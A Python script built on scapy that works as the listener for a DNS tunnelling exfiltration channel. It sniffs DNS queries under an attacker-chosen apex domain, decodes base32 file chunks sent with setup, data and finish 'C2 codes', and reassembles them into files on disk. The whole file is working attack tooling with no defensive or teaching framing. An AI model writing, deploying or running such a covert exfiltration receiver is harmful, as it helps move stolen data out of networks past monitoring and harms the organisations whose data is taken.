#! /usr/bin/env python3

from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP
import random
import string
import sys, argparse
import time, os
import base64
apexdomain = None
file_uuids = []
file_chunks = {}
num_chunks = 0


def dns_responder(pkt: IP):
    

    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0): #must be a query
        return

    query = pkt[DNS].qd.qname.decode('utf-8').strip()
    #queryname = dnsquery
    #queryname = pkt["DNS Question Record"].qname #byte class
    #query = queryname.decode('utf-8').strip()
    # print(f"opcode: {pkt[DNS].qr} query: {query}")
    if apexdomain in query[-1*len(apexdomain):]:
        # print(query)
        """
        #this query is destined for this listener, need to extra the UUID to
        determine if the file is already in transit or a new file, then start receiving the data
        
        dns query format:
        C2 codes
        A = setup query
        D = data query
        Z = file upload finished
        1. send setup_query, coded with A and number of file chunks
        2. send file_chunk_query, coded with D, each file chunk identified by its index
        3. send finish_query query with Z, denoting complete

        setup_query = UUID.CODE.NUMCHUNKS.<apexdomain>
        data_query = UUID.CODE.index.file_data.<apexdomain>
        finish_query = UUID.code.final_index.<apexdomain>
        """
        info = (query.split('.'))

        """
        info['uuid', 'code', 'index', 'filedata', 'domain', 'TLD', ''] -> anything else is some other type of query and should be discarded
                """
        if not len(info) == len(['uuid','code','index','filedata']) + len(apexdomain.split('.')):
            return

        #info[0] = uuid
        #info[1] = c2code
        #info[2] = index
        uuid = info[0]

        if uuid not in file_chunks.keys():
            file_chunks[uuid] = []

        c2code = info[1]

        index = int(info[2])

        if c2code == 'A':
            global num_chunks
            num_chunks = index
            print("Num chunks = ", num_chunks)
            print("start of file, num_chunks = ", num_chunks)
            file_chunks[uuid] =  [None] * num_chunks    #create the list with the total index length
            print("The length of the file_chunks list is: ", len(file_chunks[uuid]))

        if c2code == 'D':
            #print("UUID: ", uuid)
            #print("INDEX: " , index)
            #print("INFO: " , info[3])
            file_chunks[uuid][index] = info[3]
            print('.',end='',flush=True)

            #print(file_chunks[uuid][index])
        
        if c2code == 'Z':
            print('end of file')
            #print(file_chunks[uuid])
            save_base32_file(uuid, file_chunks[uuid])


        
    return

def save_base32_file(file_name, file_data):
    #saves a file with name file_name, going over a list of data chunks that are base32 encoded, 
    # converts them back to byte data, and saves the file
    f = open(f"receive/{file_name}", 'wb')
    for data in file_data:
        #first, convert from b32 back to data string
        #then, conver str to byte data
        #then, write to file
        b32_decode_str = base64.b32decode(data)
        #print(b32_decode_str)
        #b#yte_data = str.encode(b32_decode_str)
        #p#rint(byte_data)
        f.write(b32_decode_str)
        

    f.close()
    print(f"Wrote file to receive/{file_name}")

                    

def start_sniffer(bpf_filter, listen_int):
    print('Sniffing on ', listen_int, ' with a filter of: ', bpf_filter)

    #sniff(filter=bpf_filter, prn=dns_responder, listen_int='ens38')
    #sniff(filter=bpf_filter, prn=dns_responder, iface = listen_int)
    sniff(filter=bpf_filter, prn=dns_responder)
    #sniff(filter=bpf_filter, prn=dns_responder, listen_int=listen_int)
    

def main(args):

    if not os.path.exists('receive'):
        os.makedirs('receive')


    print(args)
    
    print("Starting DNS listener")
    global listen_int, local_ip, apexdomain
    
    
    listen_int = args['interface']
    apexdomain = args['apex']

    
    #bpf_filter =  f"udp port 53 and ip dst {args['dns']}"
    bpf_filter =  "udp port 53"
    print(listen_int)
    start_sniffer(bpf_filter, listen_int)



if __name__ == "__main__":

    ap = argparse.ArgumentParser()
    ap.add_argument('--apexdomain', dest='apex', help='The apex domain that indicates this is a packet to process. Must end with a "." ')
    ap.add_argument("-i", "--interface", type=str, default='', help='If this is a DNS receiver define the interface to listen on.')

    args = vars(ap.parse_args())
    
    main(args)
